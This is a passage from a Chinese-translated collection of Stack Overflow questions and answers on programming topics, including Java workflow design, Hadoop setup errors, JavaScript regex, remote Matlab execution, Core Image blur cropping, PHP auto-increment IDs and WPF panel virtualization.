1.  TaskPerformer ：具有名为 performTask 的方法的接口。表示要执行的任务。

2.  BagPackTask ：实现TaskPerformer 的具体类。还定义了包含打包代码的 performTask 方法。

3.  WaterPlantsTask ：另一个实现 TaskPerformer 的具体类。还定义了包含浇灌植物代码的 performTask 方法。同样，每个任务都有一个类来实现 Taskperformer 并使用 performTask 方法定义任务的行为。

4.  Workflow ：用于执行两个或更多任务的类，允许您混合和匹配现有任务。该类将包含一个 TaskPerformer 列表，并且该类的构造函数将具有一个 List 参数来请求任务执行。该类将包含一个 executeWorkflow 方法，该方法将遍历 List 并调用列表中每个元素的 performTask 方法。换句话说，该类可用于执行在实例化期间通过其 executeWorkflow 方法传递给其构造函数的所有任务。需要注意的是，您在列表中插入元素的顺序就是执行任务的顺序。

使用这种方法，您无需使用任何 if-else 条件来确定要执行的任务。您可以根据需要在多少个 Workflow 实例中重用您的 TaskPerformer 实现。你会得到一个超级干净的设计。如果您需要任何说明，请告诉我，因为我认为这种设计应该可以解决您的问题。在接受任何答案之前澄清你所有的疑问是个好主意:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T09:05:28.737

...或实施[命令模式](http://en.wikipedia.org/wiki/Command_pattern)。没有任何框架应该很容易。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:50:24.290

[Spring Batch](http://static.springsource.org/spring-batch/)的启动和运行非常简单，并允许您提交以您选择的任何顺序运行任务的作业。我建议作为起点，看看它是否满足您的需求。对于您的情况，我建议使用内存数据库（如 HSQLDB）运行它，以避免设置开销。您始终可以将作业结果记录在日志文件中。

可能最成熟的企业工作流引擎是[JBPM](http://www.jboss.org/jbpm)，但这对于您需要做的事情来说似乎有点重量级。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T21:41:49.327

看看[OSWorkflow](http://java.net/projects/osworkflow)，它非常好，轻量级，并为您提供所有开箱即用的 FSM 机器。

# hadoop - 在 hadoop 中找不到或加载主类错误

> ID：12839705
> 
> 赞同：1
> 
> 时间：2012-10-11T12:37:19.550
> 
> 标签：hadoop, cygwin

[这](http://alans.se/blog/2010/hadoop-hbase-cygwin-windows-7-x64/)是正在遵循的教程。尝试执行命令时出现错误`bin/hadoop namenode -format`。

错误是：

> 错误：无法找到或加载主类 org.apache.hadoop.util.PlatformName 已弃用：不建议使用此脚本执行 hdfs 命令。而是使用 hdfs 命令。
> 
> 错误：无法找到或加载主类 org.apache.hadoop.util.PlatformName 错误：无法找到或加载主类 org.apache.hadoop.hdfs.server.namenode.NameNode

有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T17:36:36.557

这是我的 2 美分。我有同样的问题，我在 unix 环境中重新安装了 hadoop，它工作正常。Cygwin 对 hadoop 有一些奇怪的问题，而且 windows 不是 hadoop 的好平台。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2019-02-07T16:09:41.840

hdfs 名称节点格式

错误：无法找到或加载主类 xyz

您收到此错误可能是因为您的用户名包含空格或空格，例如 amit kumar、pavan singh 等。

解决这个问题：

转到您的 C:\hadoop-2.7.7\etc\hadoop

并在任何文本编辑器中打开文件 hadoop-env.cmd，最后将 %USERNAME% 替换为任何名称但没有空格

替换此 **设置 HADOOP_IDENT_STRING=%USERNAME%**

有了这个

**设置 HADOOP_IDENT_STRING=AMIT**

或者只需关注此视频 [http://www.youtube.com/watch?v=Y6wck9dKVKQ](http://www.youtube.com/watch?v=Y6wck9dKVKQ)

# javascript - 不区分大小写的搜索和区分大小写的替换

> ID：12839707
> 
> 赞同：7
> 
> 时间：2012-10-11T12:37:24.923
> 
> 标签：javascript, regex

我有一个简单的正则表达式搜索和替换功能，想知道是否有一种好方法可以在不区分大小写的搜索中进行区分大小写的替换？下面的例子：

```
function filter(searchTerm) {
    var searchPattern = new RegExp(searchTerm, 'ig');
    ....
    textToCheck = textToCheck.replace(searchPattern, '<span class="searchMatchTitle">' + searchTerm + '</span>'); 
```

函数顶部的搜索词可能有一个大写字母，我想让它匹配任何带有大写或小写的字符串，因此是“i”标志。

在进行替换时，我最终得到了奇怪的结果，因为它采用原始搜索字符串（可以是任何混合）并在可能存在不同格式的情况下使用该替换。

我真的很喜欢保留原始格式并在其周围添加跨度。我的方法是最好的方法吗？如果是，你能像在 Perl 中那样使用组吗？例如

```
s/ \(=\+\) /\1/g 
```

我尝试使用类似类型的语法和示例形成网络只会导致文字字符串替换

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-11T12:43:27.970

```
function filter(searchTerm) {
    var searchPattern = new RegExp('('+searchTerm+')', 'ig');
    ....
    textToCheck = textToCheck.replace(searchPattern, '<span class="searchMatchTitle">$1</span>');
    ...
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-11T12:42:57.900

您可以使用组，但语法略有不同。尝试这样的事情：

```
var str = 'this is a dog eat Dog eat DOG world'
str = str.replace(/(dog)/gi, '<span>$1</span>')

// str is now: "this is a <span>dog</span> eat <span>Dog</span> eat <span>DOG</span> world" 
```

# linux - 在远程机器上运行 Matlab 任务

> ID：12839709
> 
> 赞同：3
> 
> 时间：2012-10-11T12:37:25.507
> 
> 标签：linux, matlab, ssh, remote-desktop

我正在使用 Matlab 中的机器学习任务（使用 Matlab 的神经网络工具箱）。因此，我需要运行对 RAM 和处理器时间要求非常高的计算。我的计算机不足以完成这项任务，但我可以访问足够强大的 Linux 服务器。

我正在寻找如何从在该服务器上我自己的计算机上运行的 Matlab GUI 运行计算任务的方法。理想情况下，它应该在以下条件下工作：

*   我的电脑运行的是 Windows 7，服务器 Red Hat Linux
*   我只能使用 SSH 协议连接到服务器（目前我正在使用 putty 来完成该任务）
*   服务器没有安装 Matlab。我可以要求服务器管理员安装它，但这可能需要一些时间，如果不需要的话会更好。服务器上安装了 Java 虚拟机（和开发工具包）。
*   我更喜欢在我的电脑上使用 Matlab GUI（不是 Matlab 命令行）

我怎样才能做到这一点？如果您需要有关设置的更多信息或知道其他解决方案，请发表评论。我很乐意回应。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T13:45:04.080

正如评论中所暗示的，[Parallel Computing Toolbox](http://www.mathworks.co.uk/products/parallel-computing/) + [MATLAB Distributed Computing Server](http://www.mathworks.co.uk/products/distriben/)可以解决这个问题，如果您正在积极更新代码，它可能比该`mcc`方法更简单。但是，您必须在服务器上安装 MDCS 部件并进行设置。如果您不使用任何 MEX 文件，那么架构上的差异应该是无关紧要的。如果您使用的是 MEX 文件，则需要确保您可以针对服务器架构编译它们并使它们在那里可用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-11T12:51:20.800

如果服务器上没有 matlab，唯一的方法是：

> *   修改代码，使其输出文件
>     
>     
> *   `mcc`使用（需要工具箱）编译您的代码
>     
>     
> *   将其发送到您的服务器（您有共享磁盘吗？否则使用`pscp` [http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html](http://www.chiark.greenend.org.uk/%7Esgtatham/putty/download.html)）
>     
>     
> *   执行它（从命令行使用腻子）
>     
>     
> *   取回输出文件（与发送相同）

我们都在我的实验室里这样做（除了我们在 ubuntu 上）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-07-27T07:52:11.323

您可以从本地 PC 在远程 Linux 服务器上运行 MATLAB 作业，而无需设置 MDCS，但是对于大规模和多用户，强烈建议使用 MCDS。您可以使用 plink 从 MATLAB 自动执行 putty 命令行。

我们正在功能更强大的远程 Linux 服务器上执行多次迭代的 Simulink 模型仿真。您将需要以下内容：

1) 使用并行计算工具箱在客户​​端和服务器机器上安装 MATLAB

2）映射的Linux服务器共享网络驱动器（用于数据I/O）

3) Plink 用于自动化 Putty

4) 用于在远程机器上静默执行 MATLAB 的命令行脚本

MATLAB 代码示例：

```
plinkFile = which('plink.exe');

command = [plinkFile ' -ssh ' [ServerUrl] ' -l ' [Username] ...
                    ' -pw ' [Password] ' matlab -nodesktop -nosplash ' ...
                    '-r "' [RemoteScriptName] ...
                    '\(\''' InputDataSharedDriveFilePath] '\''\);" &'];  

[status,cmdout] = system(command); 
```

# nosql - 列族数据库分片和复制 [NoSQL Distilled]

> ID：12839710
> 
> 赞同：4
> 
> 时间：2012-10-11T12:37:26.230
> 
> 标签：nosql, cassandra, replication, sharding, bigtable

在NoSQL Distilled 一书的*4.5 Combining Sharding and Replication*中，做出如下断言：

> “使用对等复制和分片是列族数据库的常用策略。”

该声明省略了其他类型的集群就绪数据库，即键值和文档存储。为什么会这样？这些数据库是否非常适合分片，但不适合与对等复制结合使用？在这些情况下，主从复制是更好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T13:23:32.447

对等复制更多地与一致性模型有关。您在容错和一致性之间进行权衡，其中点对点模型选择前者，而主从模型选择后者。可以通过使用仲裁读取和写入等方式实现一致性，因此您通常可以在实践中同时实现这两者——即使数据库在技术上并不一致。

肯定有使用对等复制的非 CF 存储的示例，例如[CouchBase](http://www.couchbase.com/)（文档存储）和[Riak](http://wiki.basho.com/)（KV 存储）。这些数据库性能非常好，并以某种形式使用自动分片。

# .net - SQL Server Management Studio 是否随 Visual Studio 提供？

> ID：12839716
> 
> 赞同：23
> 
> 时间：2012-10-11T12:37:34.687
> 
> 标签：.net, sql-server, visual-studio-2010, ssms

我已经安装了完整的 Visual Studio 2010（不是 express），以及附带的 SQL Server：

![在此处输入图像描述](../Images/a9eb0d0d0734e41be052188de67812f4.png)

我试图找到 SQL Server Management Studio ( [ssms](http://en.wikipedia.org/wiki/SQL_Server_Management_Studio) ) 以遵循[本教程](http://www.youtube.com/watch?v=OJfYSZzZOP8)，但我似乎无法在我的安装中找到它。

理论上我可以下载[2008 Management Studio Express](http://www.microsoft.com/en-us/download/details.aspx?id=7593)但是考虑到 SSMS 的这么多版本和版本（例如[2012 Express](http://www.microsoft.com/en-us/download/details.aspx?id=29062)），我怎么知道它是否与我的 VS 2010 兼容？

另外，如果我的原始 Visual Studio 2010 DVD 中已经有 Express Edition，为什么还要下载它？

所以我的问题是：

1.  SSMS 是否已安装但我没有看到？（如果是这样，我如何找到它？）
2.  如果没有安装，我是否只需要再次运行安装程序，然后安装它？
3.  如果它不是真的在 VS 2010 DVD 上（正如 SO 上的许多建议），哪个可下载的 Express 版本与我的 VS 2010（不是 express）最兼容？

**更新：（**为了未来的 MS SQL Server 新人的利益）

感谢下面的答案，我成功地安装了我需要的东西，最重要的是**了解**了工具图片。

因此，要一一回答我的特定问题：

1.  不
2.  不
3.  SQL Server 管理工作室**2008**速成版

**尖端：**

1.  安装完所有内容后，下一个问题是*“我接下来要做什么？”* . 幸运的是，有一个[很棒的教程](http://www.functionx.com/sqlserver/Lesson03.htm)对我来说比繁琐的（重复、循环链接、非线性等）[微软官方文档](http://msdn.microsoft.com/en-us/library/bb500434%28v=sql.105%29.aspx)要清晰得多。
2.  尽管 functionx.com 教程很棒，但它没有提供有关如何最初连接[到 local](https://stackoverflow.com/questions/360141/how-to-connect-to-local-instance-of-sql-server-2008-express)的足够详细信息。再次，SO 来救援并阐明必须满足另外两个条件：**(a)** SQL Server [Browser](https://stackoverflow.com/a/10421827)服务必须正在运行。**(b)**服务器名称不能是“本地”，而是`<local-pc-name>\SQLEXPRESS`.
3.  要以编程方式在 C# 中创建数据库，也可以使用[ADO.NET](http://support.microsoft.com/kb/307283)。
4.  [为什么](https://stackoverflow.com/questions/529142/what-good-are-sql-server-schemas)使用模式。
5.  甚至不要考虑将数据库文件存储在[网络共享](https://stackoverflow.com/a/11954379/1731850)上。
6.  如果您在刚创建的表的 SELECT 语句中得到“无效的对象名称”，请[刷新本地缓存](https://stackoverflow.com/a/1362575/1731850)。
7.  当`System.Data.SqlClient.SqlException`您第一次将 C# 与现有数据库一起使用`new SqlConnection()`时，请记住“数据源 =”不能单独指定计算机名称（如教程中所示），而是将 \SQLEXPRESS 附加到计算机名称。此外，请确保启用[TCP/IP 客户端协议。](http://blog.sqlauthority.com/2009/05/21/sql-server-fix-error-provider-named-pipes-provider-error-40-could-not-open-a-connection-to-sql-server-microsoft-sql-server-error/)

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-10-11T12:43:39.737

SSMS 用于运行查询和执行数据库管理任务等。配置管理器是 SQL Server 的配置工具，您可以在其中配置（启动/停止/用户凭据等）SQL Server 使用的服务。

但是，安装 Visual Studio 并不意味着您获得了 SQL Server 的完整版，而是您获得了 Express 版，其中不包含 SSMS。

也许[这个 MSDN 链接](http://blogs.msdn.com/b/bethmassi/archive/2011/02/18/step-by-step-installing-sql-server-management-studio-2008-express-after-visual-studio-2010.aspx)会有所帮助。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-11T12:44:31.073

正如 bugfinder 和其他人（对所有人 +1）所说，sql management studio 和 sql configuration manager 是不一样的。

您拥有哪个视觉工作室版本并不重要。

重要的是您拥有的 sql server 版本。即您已经安装了 sql server 2008，因此您应该下载 sql server 2008 的管理工作室。（您的问题中有链接）。我有 vs 2010 终极版，它没有合并管理工作室。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-11T12:40:23.617

没有配置管理器用于配置 SQL 服务器允许连接的方式。仍然有一个“SQL Server Management Studio”用于查询等

# apache - Apache中的重定向

> ID：12839722
> 
> 赞同：0
> 
> 时间：2012-10-11T12:37:45.220
> 
> 标签：apache, http, redirect

任何人都可以帮忙。我需要编写一个重定向规则：

将所有 HTTPS 流量重定向回 HTTP，除非其中包含 URL /administrator。

```
RewriteEngine on

RewriteCond %{REQUEST_URI} !^administrator/
RewriteRule .? http://www.site2.com%{REQUEST_URI} [R=301,L] 
```

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T20:13:33.563

您需要包含一个条件来检查它是否是 HTTPS：

```
RewriteEngine on

RewriteCond %{HTTPS} on
RewriteCond %{REQUEST_URI} !^administrator/
RewriteRule .? http://www.site2.com%{REQUEST_URI} [R=301,L] 
```

# javascript - Cookies 在 iPhone IOS 和 ANDROID 上使用 PHONEGAP 有效吗？

> ID：12839725
> 
> 赞同：1
> 
> 时间：2012-10-11T12:37:48.900
> 
> 标签：javascript, android, ios, cordova, cookies

我想知道我是否可以使用 PhoneGap (webview) 在移动设备（IOS 和 ANDROID）上存储网络 cookie。

请注意，cookie 是标准的，没有第三方 cookie 或类似的。

为了使用 PhoneGap 和 cookie，我想知道我应该在我的 Phone-Gap 项目中设置什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T14:15:05.470

您的 PhoneGap 正在设备本身上运行 HTML，因此这种意义上的 cookie**不一定**有意义。但是，如果您正在谈论您的应用程序向其他服务器发出的 AJAX 请求，那么是的，cookie 应该可以正常工作。

# objective-c - CIGaussianBlur 的正确裁剪

> ID：12839729
> 
> 赞同：34
> 
> 时间：2012-10-11T12:38:01.990
> 
> 标签：objective-c, macos, core-image

正如我注意到当 CIGaussianBlur 应用于图像时，图像的角落变得模糊，因此看起来比原始图像小。所以我发现我需要正确裁剪它以避免图像的透明边缘。但是如何根据模糊量计算我需要裁剪多少？

* * *

例子：

原图：
![在此处输入图像描述](../Images/cf8324b00ff6cdf25c25a303c2b68535.png)

带有 CIGaussianBlur 的 50 inputRadius 的图像（蓝色是所有内容的背景）：
![在此处输入图像描述](../Images/a36cb9e2ba59f2506b85199b02eadc7a.png)

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2012-11-21T17:09:07.927

以下面的代码为例...

```
CIContext *context = [CIContext contextWithOptions:nil];

CIImage *inputImage = [[CIImage alloc] initWithImage:image];

CIFilter *filter = [CIFilter filterWithName:@"CIGaussianBlur"];

[filter setValue:inputImage forKey:kCIInputImageKey];

[filter setValue:[NSNumber numberWithFloat:5.0f] forKey:@"inputRadius"];

CIImage *result = [filter valueForKey:kCIOutputImageKey];

CGImageRef cgImage = [context createCGImage:result fromRect:[result extent]]; 
```

这会产生您在上面提供的图像。但是，如果我改为使用原始图像 rect 从上下文创建 CGImage，则生成的图像是所需的大小。

```
CGImageRef cgImage = [context createCGImage:result fromRect:[inputImage extent]];
```

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2013-08-09T01:14:50.270

有两个问题。首先是模糊过滤器对输入图像边缘之外的像素进行采样。这些像素是透明的。这就是透明像素的来源。诀窍是在应用模糊滤镜之前扩展边缘。这可以通过钳位滤波器来完成，例如：

```
CIFilter *affineClampFilter = [CIFilter filterWithName:@"CIAffineClamp"];

CGAffineTransform xform = CGAffineTransformMakeScale(1.0, 1.0);
[affineClampFilter setValue:[NSValue valueWithBytes:&xform
                                           objCType:@encode(CGAffineTransform)]
                     forKey:@"inputTransform"]; 
```

该过滤器无限扩展边缘并消除透明度。下一步是应用模糊滤镜。

第二个问题有点奇怪。一些渲染器为模糊过滤器生成更大的输出图像，您必须通过一些偏移量调整生成的 CIImage 的原点，例如：

```
CGImageRef cgImage = [context createCGImage:outputImage
                                   fromRect:CGRectOffset([inputImage extend],
                                                         offset, offset)]; 
```

我 iPhone 上的软件渲染器需要三倍的模糊半径作为偏移量。同一部 iPhone 上的硬件渲染器根本不需要任何偏移。也许你可以从输入和输出图像的大小差异中推断出偏移量，但我没有尝试......

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2015-06-24T08:45:02.397

要获得具有硬边缘的图像的漂亮模糊版本，您首先需要将 CIAffineClamp 应用于源图像，将其边缘向外延伸，然后您需要确保在生成输出图像时使用输入图像的范围。

代码如下：

```
CIContext *context = [CIContext contextWithOptions:nil];

UIImage *image = [UIImage imageNamed:@"Flower"];
CIImage *inputImage = [[CIImage alloc] initWithImage:image];

CIFilter *clampFilter = [CIFilter filterWithName:@"CIAffineClamp"];
[clampFilter setDefaults];
[clampFilter setValue:inputImage forKey:kCIInputImageKey];

CIFilter *blurFilter = [CIFilter filterWithName:@"CIGaussianBlur"];
[blurFilter setValue:clampFilter.outputImage forKey:kCIInputImageKey];
[blurFilter setValue:@10.0f forKey:@"inputRadius"];

CIImage *result = [blurFilter valueForKey:kCIOutputImageKey];

CGImageRef cgImage = [context createCGImage:result fromRect:[inputImage extent]];
UIImage result = [[UIImage alloc] initWithCGImage:cgImage scale:image.scale orientation:UIImageOrientationUp];

CGImageRelease(cgImage); 
```

> 请注意，此代码已在 iOS 上进行了测试。它应该与 OS X 类似（用 NSImage 代替 UIImage）。

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2018-12-19T09:56:47.137

I saw some of the solutions and wanted to recommend a more modern one, based off some of the ideas shared here:

```
private lazy var coreImageContext = CIContext() // Re-use this.

func blurredImage(image: CIImage, radius: CGFloat) -> CGImage? {
    let blurredImage = image
        .clampedToExtent()
        .applyingFilter(
            "CIGaussianBlur",
            parameters: [
                kCIInputRadiusKey: radius,
            ]
        )
        .cropped(to: image.extent)

    return coreImageContext.createCGImage(blurredImage, from: blurredImage.extent)
} 
```

If you need a `UIImage` afterward, you can of course get it like so:

```
let image = UIImage(cgImage: cgImage) 
```

... For those wondering, the reason for returning a `CGImage` is (as noted in the [Apple documentation](https://developer.apple.com/documentation/coreimage/ciimage/1437833-cropped)):

> Due to Core Image's coordinate system mismatch with `UIKit`, this filtering approach may yield unexpected results when displayed in a `UIImageView` with "contentMode". Be sure to back it with a `CGImage` so that it handles contentMode properly.

If you need a `CIImage` you could return that, but in this case if you're displaying the image, you'd probably want to be careful.

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2013-11-07T16:02:06.547

这对我有用:)

```
CIContext *context = [CIContext contextWithOptions:nil];
CIImage *inputImage = [[CIImage alloc] initWithImage:image];
CIFilter *blurFilter = [CIFilter filterWithName:@"CIGaussianBlur"];
[blurFilter setDefaults];
[blurFilter setValue:inputImage forKey:@"inputImage"];
CGFloat blurLevel = 20.0f;          // Set blur level
[blurFilter setValue:[NSNumber numberWithFloat:blurLevel] forKey:@"inputRadius"];    // set value for blur level
CIImage *outputImage = [blurFilter valueForKey:@"outputImage"];
CGRect rect = inputImage.extent;    // Create Rect
rect.origin.x += blurLevel;         // and set custom params
rect.origin.y += blurLevel;         // 
rect.size.height -= blurLevel*2.0f; //
rect.size.width -= blurLevel*2.0f;  //
CGImageRef cgImage = [context createCGImage:outputImage fromRect:rect];    // Then apply new rect
imageView.image = [UIImage imageWithCGImage:cgImage];
CGImageRelease(cgImage); 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2019-09-06T19:41:26.827

这是模糊图像的 Swift 5 版本。将 Clamp 过滤器设置为默认值，这样您就无需进行转换。

```
func applyBlurEffect() -> UIImage? {

    let context = CIContext(options: nil)
    let imageToBlur = CIImage(image: self)
    let clampFilter = CIFilter(name: "CIAffineClamp")!
    clampFilter.setDefaults()
    clampFilter.setValue(imageToBlur, forKey: kCIInputImageKey)

    //The CIAffineClamp filter is setting your extent as infinite, which then confounds your context. Try saving off the pre-clamp extent CGRect, and then supplying that to the context initializer.
    let inputImageExtent = imageToBlur!.extent

    guard let currentFilter = CIFilter(name: "CIGaussianBlur") else {
        return nil
    }
    currentFilter.setValue(clampFilter.outputImage, forKey: kCIInputImageKey)
    currentFilter.setValue(10, forKey: "inputRadius")
    guard let output = currentFilter.outputImage, let cgimg = context.createCGImage(output, from: inputImageExtent) else {
        return nil
    }
    return UIImage(cgImage: cgimg)

} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-10-24T10:18:42.433

这是斯威夫特版本：

```
func applyBlurEffect(image: UIImage) -> UIImage {
    let context = CIContext(options: nil)
    let imageToBlur = CIImage(image: image)
    let blurfilter = CIFilter(name: "CIGaussianBlur")
    blurfilter!.setValue(imageToBlur, forKey: "inputImage")
    blurfilter!.setValue(5.0, forKey: "inputRadius")
    let resultImage = blurfilter!.valueForKey("outputImage") as! CIImage
    let cgImage = context.createCGImage(resultImage, fromRect: resultImage.extent)
    let blurredImage = UIImage(CGImage: cgImage)
    return blurredImage

} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-09-26T15:00:30.890

请参阅以下**Xamarin** (C#) 的两个实现。

### 1) 适用于 iOS 6

```
public static UIImage Blur(UIImage image)
{   
    using(var blur = new CIGaussianBlur())
    {
        blur.Image = new CIImage(image);
        blur.Radius = 6.5f;

        using(CIImage output = blur.OutputImage)
        using(CIContext context = CIContext.FromOptions(null))
        using(CGImage cgimage = context.CreateCGImage (output, new RectangleF(0, 0, image.Size.Width, image.Size.Height)))
        {
            return UIImage.FromImage(cgimage);
        }
    }
} 
```

### 2) iOS 7 的实现

使用上面显示的方式不再在 iOS 7 上正常工作（至少目前使用 Xamarin 7.0.1）。所以我决定以另一种方式添加裁剪（措施可能取决于模糊半径）。

```
private static UIImage BlurImage(UIImage image)
{   
    using(var blur = new CIGaussianBlur())
    {
        blur.Image = new CIImage(image);
        blur.Radius = 6.5f;

        using(CIImage output = blur.OutputImage)
        using(CIContext context = CIContext.FromOptions(null))
        using(CGImage cgimage = context.CreateCGImage (output, new RectangleF(0, 0, image.Size.Width, image.Size.Height)))
        {
            return UIImage.FromImage(Crop(CIImage.FromCGImage(cgimage), image.Size.Width, image.Size.Height));
        }
    }
}

private static CIImage Crop(CIImage image, float width, float height)
{
    var crop = new CICrop
    { 
        Image = image,
        Rectangle = new CIVector(10, 10, width - 20, height - 20) 
    };

    return crop.OutputImage;   
} 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-10-16T13:43:30.377

试试这个，让输入的范围是`-createCGImage:fromRect:`参数：

```
-(UIImage *)gaussianBlurImageWithRadius:(CGFloat)radius {
    CIContext *context = [CIContext contextWithOptions:nil];
    CIImage *input = [CIImage imageWithCGImage:self.CGImage];
    CIFilter *filter = [CIFilter filterWithName:@"CIGaussianBlur"];
    [filter setValue:input forKey:kCIInputImageKey];
    [filter setValue:@(radius) forKey:kCIInputRadiusKey];
    CIImage *output = [filter valueForKey:kCIOutputImageKey];
    CGImageRef imgRef = [context createCGImage:output
                                      fromRect:input.extent];
    UIImage *outImage = [UIImage imageWithCGImage:imgRef
                                            scale:UIScreen.mainScreen.scale
                                      orientation:UIImageOrientationUp];
    CGImageRelease(imgRef);
    return outImage;
} 
```

# php - $next_avail ID - 我的网站需要的一种 auto_increment - 查询速度

> ID：12839730
> 
> 赞同：0
> 
> 时间：2012-10-11T12:38:06.983
> 
> 标签：php, mysql

我正在开发一个**门户网站**/大型网站，我有一个关于如何在特殊情况下优化我的 mySql / PDO 查询的问题。

我是这样开发的：当我插入一个 iD（唯一/主要）时，我执行以下代码来找出*特定表中最高的***未使用**id ，然后使用该 id（$next_avail）进行**插入。**

 ***在最后几天在*stackoverflow*上进行了简短的聊天后，我得到了 AUTO_INCREMENT 最适合此操作的想法。

但是现在，我意识到在大多数情况下，我也使用 $next_avail（AUTO_INCREMENT 的值）将其作为列插入其他表中。

所以我的代码对这些插入有意义。

我的问题是，下面的代码如何以速度为数百万行工作，因为我所做的每个插入都取决于它。

请写评论并要求我澄清这个问题中你不清楚的地方。

谢谢，阿德里安

```
$next_avail = 1 ;
                    $stmt = $db->prepare("SELECT news_id from mya_news ORDER BY news_id DESC LIMIT 1");
                    $stmt->execute();
                    while ( list($id) = $stmt->fetch(PDO::FETCH_BOTH) ) {                                                   
                        $next_avail = $id + 1;
                    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:43:27.900

您不需要这样做，只需在表中使用 auto_increment，还可以使用 PHP 函数获取 last_inserted_id`mysql_insert_id()`

看看这个网站： http: [//php.net/manual/en/function.mysql-insert-id.php](http://php.net/manual/en/function.mysql-insert-id.php)

这个是 PDO [http://php.net/manual/en/pdo.lastinsertid.php](http://php.net/manual/en/pdo.lastinsertid.php)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T12:47:19.853

可能使用 max 而不是对结果进行排序并使用限制。

然而，这是非常危险的。有可能 2 位处理将同时获得相同的 $next_avail。我建议更改插入行的顺序（或者甚至插入一个虚拟行以获取下一个 id，并稍后更新该行）以使用 AUTO_INCREMENT 列值***

# wpf - WPF 流布局

> ID：12839739
> 
> 赞同：1
> 
> 时间：2012-10-11T12:38:53.477
> 
> 标签：wpf, layout, listbox, itemscontrol, flowlayout

我有一个 ListBox，里面有一个水平 WrapPanel 来创建一个内容网格。它产生了正确的布局，但是超过一百个左右的项目*真的很慢。*

我在谷歌上看到了一些虚拟化 WrapPanel 的半生不熟的尝试，但它们似乎都没有准备好生产。

我错过了一个技巧吗？如何获得高性能和灵活（需要在调整大小时重排）面板布局？

（注意：单元格是固定大小的）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T13:41:53.203

是的，虚拟化是正确的步骤。*WPF 不能一次*处理大量的 UI 项。编写自己的 VirtualizingWrapPanel 需要大量的 WPF 经验。WPF 没有“现成的”解决方案，因此您要么必须编写它，要么使用其他人的工作。

> 与提供与 StackPanel 相同功能的 VirtualizingStackPanel 不同，这并不完全像 WPF 附带的默认 WrapPanel 那样，有一些原因：
> 
> 1- WrapPanels 可以在两个方向上增长，而 StackPanels 只能垂直或水平增长。此外，与面板方向正交的方向上的增长取决于面板方向方向上项目的大小，因此除非最后一行上所有项目的大小，否则不可能换行/列/列是已知的，但是如果正在虚拟化面板的两个方向，则这是不可能的（因为它会进行基于非像素的测量以提高性能）。
> 
> 2-范围的大小与行/列（节）的数量相同。在 StackPanel 上这不是问题：由于每个部分只允许一个项目，因此范围宽度/高度是项目数。在 WrapPanel 上，section 的数量很大程度上取决于 item 的大小，并且由于 item 的大小不是固定的，可以在任何方向变化，因此无法计算 WrapPanel 上的 section 数量。
> 
> 开发此面板时采用了以下解决方案：
> 
> 1- 小组的范围永远无法确定。相反，在每个 MeasureOverride 之后，使用以下表达式估计节数：“numberofitems/averageitemspersection”。由于每个部分的平均项目数在每次滚动后都会更新，因此面板的范围是动态的。如果面板方向中的项目大小是固定的，则范围将是静态的。
> 
> 2- items section/sectionindex 只能按顺序计算，因此如果您正在查看第一个项目并且您跳转到绕过一个或多个未实现部分的部分，面板将使用估计来知道哪个项目是第一个可见的，如果您返回已实现的部分并按顺序返回，这将得到纠正。例如：如果面板知道第 12 项在第 1 部分，并且面板估计每个部分有 10 个项目，（第 0 部分是第一个），如果您跳转到第 9 部分，面板将显示第 100 个项目作为第一个可见项目（只有从第 1 节到第 9 节，每节正好有 10 个项目，这才是正确的）。但是如果你回到第 1 部分并按顺序访问所有部分，直到到达第 9 部分，
> 
> 3- 通常，滚动查看器内的 WrapPanel 可以垂直和水平滚动，但由于我只能虚拟化一个方向，因此此 wrappanel 只会在与面板方向正交的方向上滚动。（这意味着您不应该设置虚拟化面板高度/宽度明确）。

复制自；[http://virtualwrappanel.codeplex.com/](http://virtualwrappanel.codeplex.com/)

我不明白您所说的固定单元是什么意思，但是如果每个项目的宽度/高度是固定的，那么您可以编写比我提供的虚拟化更好的虚拟化（VirtualWrapPanel）。只需浏览代码并尝试了解发生了什么。

您所说的“不太有效”可能是因为不可能制作出与一个 WrapPanel 完全相同的良好 VirtualizingWrapPanel（因为具体的项目行取决于下一个项目等等。），但如果你结合每个项目具有相同宽度/高度的事实，我相信你可以做得更好。

此外，您可以根据这些文章编写自己的解决方案来开始；

一：http: [//blogs.msdn.com/dancre/archive/2006/02/06/implementing-a-virtualized-panel-in-wpf-avalon.aspx](http://blogs.msdn.com/dancre/archive/2006/02/06/implementing-a-virtualized-panel-in-wpf-avalon.aspx)

二：http: [//blogs.msdn.com/dancre/archive/2006/02/13/531550.aspx](http://blogs.msdn.com/dancre/archive/2006/02/13/531550.aspx)

三：http: [//blogs.msdn.com/dancre/archive/2006/02/14/532333.aspx](http://blogs.msdn.com/dancre/archive/2006/02/14/532333.aspx)

